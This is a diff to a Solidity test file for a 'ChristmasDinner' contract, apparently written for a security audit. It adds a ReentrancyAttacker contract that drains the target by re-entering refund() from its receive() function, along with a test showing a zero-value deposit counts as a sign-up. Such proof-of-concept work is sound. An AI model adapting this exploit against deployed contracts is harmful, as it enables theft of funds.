@@ -265,45 +265,47 @@ contract ChristmasDinnerTest is Test {
     }
 
     function testReentrance() public {
+        vm.deal(user1, 10 ether);
         vm.prank(user1);
-        cd.deposit(address(usdc), 2e18);
-        uint256 depositAmount = 1e18;
+        address(cd).call{value: 10 ether}("");
 
-        ReentrancyAttacker attacker = new ReentrancyAttacker(cd, usdc);
-        usdc.mint(address(attacker), depositAmount);
+        ReentrancyAttacker attacker = new ReentrancyAttacker(cd);
 
-        uint256 startingAttackerBalance = ERC20Mock(usdc).balanceOf(address(attacker));
-        uint256 startingContractBalance = ERC20Mock(usdc).balanceOf(address(cd));
+        uint256 startingAttackerBalance = address(attacker).balance;
+        uint256 startingContractBalance = address(cd).balance;
 
         attacker.attack();
 
-        uint256 endingAttackerBalance = ERC20Mock(usdc).balanceOf(address(attacker));
-        uint256 endingContractBalance = ERC20Mock(usdc).balanceOf(address(cd));
+        uint256 endingAttackerBalance = address(attacker).balance;
+        uint256 endingContractBalance = address(cd).balance;
 
         assertEq(endingAttackerBalance, startingContractBalance + startingAttackerBalance);
         assertEq(endingContractBalance, 0);
+    }
+
+    function test_signUpWithoutPay() public{
+        address newUser = makeAddr("new user");
+        vm.startPrank(newUser);
+        cd.deposit(address(wbtc), 0);
+        vm.stopPrank();
     }
 }
 
 contract ReentrancyAttacker {
     ChristmasDinner cd;
-    ERC20Mock usdc;
-    uint256 depositAmount = 1e18;
 
-    constructor(ChristmasDinner _christmasDinner, ERC20Mock _usdc) {
+    constructor(ChristmasDinner _christmasDinner) {
         cd = ChristmasDinner(_christmasDinner);
-        usdc = _usdc;
-        usdc.approve(address(cd), depositAmount);
     }
 
     function attack() external payable {
-        cd.deposit(address(usdc), depositAmount);
+        address(cd).call{value: 1 ether}("");
         cd.refund();
     }
 
     receive() external payable {
-        console.log(ERC20Mock(usdc).balanceOf(address(cd)));
-        if (ERC20Mock(usdc).balanceOf(address(cd)) > depositAmount) {
+        console.log(address(cd).balance);
+        if (address(cd).balance > 1 ether) {
             cd.refund();
         }
     }
